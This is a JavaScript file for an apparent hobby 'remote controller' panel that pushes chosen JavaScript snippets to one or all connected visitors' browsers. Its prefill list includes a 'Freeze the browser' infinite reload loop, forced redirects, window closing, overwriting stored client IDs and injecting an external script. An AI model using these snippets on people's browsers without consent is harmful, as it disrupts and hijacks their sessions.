
let allClientsAllowed = false;
let clientToControl = "";


function addPrefills() {
  const prefills = document.getElementById("Prefills");
  const header = document.getElementById("header");
//add the option list stuff
  prefills.innerHTML = `
    <option value="alert('')">Alert</option>
    <option value='showToast("", "#", "blue", "3000")'>Toast</option>
    <option value="//localStorage.setItem('customClientID', '')">Change User Set Name</option>
    <option value="//localStorage.setItem('constID', '')">Change Constant ID</option>
    <option value="window.location.replace('https://')">Replace URL</option>
    <option value="window.location.replace('css/other-assets/index.html')">Rick Roll</option>
    <option value="window.location.reload()">Reload</option>
    <option value='sendNotification("Hello", "Body of message", "")'>Notification</option>
    <option value="open(location, '_self').close()">Close window</option>
    <option value="window.open('https://')">Open window</option>
    <option value="javascript:(function () {var script=document.createElement('script');script.src='https://x-ray-goggles.mouse.org/webxray.js';script.className='webxray';script.setAttribute('data-lang','en-US');script.setAttribute('data-baseuri','https://x-ray-goggles.mouse.org');document.body.appendChild(script);}())">X-ray</option>
    <option value="while(1) location.reload(1)">Freeze the browser</option>
    <option value="popup('')">Popup</option>
	<option value="playAudio('')">Play Audio</option>
  `;

  header.innerHTML = " Avery's File-Z Remote Controller";
}

function allowAllClients() {
  const clientSelector = document.getElementById("clientSelector");
//add the option list stuff
  clientSelector.innerHTML = `
    <option value="all">All Clients</option>
  `;
allClientsAllowed = true;
}


document.getElementById("clientSelector").addEventListener("change", () => {

	clientToControl = document.getElementById("clientSelector").value;
	console.log(`Saved ${clientToControl}`);
	
});



// Select the target element
const clientSelector = document.getElementById('clientSelector');

// Create a new instance of MutationObserver with a callback function
const observer = new MutationObserver((mutations) => {
  // Check for changes in the inner HTML
  mutations.forEach((mutation) => {
    if (mutation.type === 'childList' && mutation.target === clientSelector) {
      // Call your function when inner HTML changes
      fixAllMyProblems();
    }
  });
});

// Configuration of the observer (you can customize it based on your needs)
const config = { childList: true, subtree: true };

// Start observing the target element
observer.observe(clientSelector, config);

// Function to call when inner HTML changes
function fixAllMyProblems() {
  
  document.getElementById("clientSelector").value = clientToControl;
}



//permissions

//allowAllClients();
addPrefills();
isAuthed();


